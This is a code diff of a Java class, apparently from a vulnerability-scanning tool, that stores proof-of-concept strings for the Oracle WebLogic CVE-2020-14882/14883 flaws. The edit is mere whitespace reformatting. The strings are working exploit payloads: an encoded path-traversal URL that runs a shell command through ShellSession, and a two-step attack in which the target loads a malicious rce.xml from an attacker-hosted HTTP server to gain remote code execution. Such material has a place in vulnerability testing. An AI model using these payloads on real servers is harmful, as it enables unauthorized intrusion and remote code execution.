@@ -14,12 +14,14 @@ import java.util.List;
 public class Weblogic {
     public static String CVE_2020_14882_14883_1_poc = "##Condition##\n" +
             "14882(IDOR) version 10.3.6.0.0/12.1.3.0.0/12.2.1.3.0/12.2.1.4.0/14.1.1.0.0" +
-            "14883 version 12.2.1+\n\n" +
+            "14883 version 12.2.1+\n" +
+            "\n" +
             "##POC##\n" +
             "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');\")";
     public static String CVE_2020_14882_14883_xml_poc = "##Condition##\n" +
             "14882(IDOR) version 10.3.6.0.0/12.1.3.0.0/12.2.1.3.0/12.2.1.4.0/14.1.1.0.0\n" +
-            "14883 version all\n\n" +
+            "14883 version all\n" +
+            "\n" +
             "##Evil xml##\n" +
             "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n" +
             "<beans xmlns=\"http://www.springframework.org/schema/beans\"\n" +
@@ -36,10 +38,12 @@ public class Weblogic {
             "    </bean>\n" +
             "</beans>\n\n" +
             "##Step1##\n" +
-            "start http service -> python -m http.server 8808\n\n" +
+            "start http service -> python -m http.server 8808\n" +
+            "\n" +
             "##Step2##\n" +
             "#POC#\n" +
             "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(\"http://#httpserver#:8808/rce.xml\")\n" +
+            "\n" +
             "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext(\"http://#httpserver#:8808/rce.xml\")";
 
         public static void CVE_2020_14882_14883_1() {
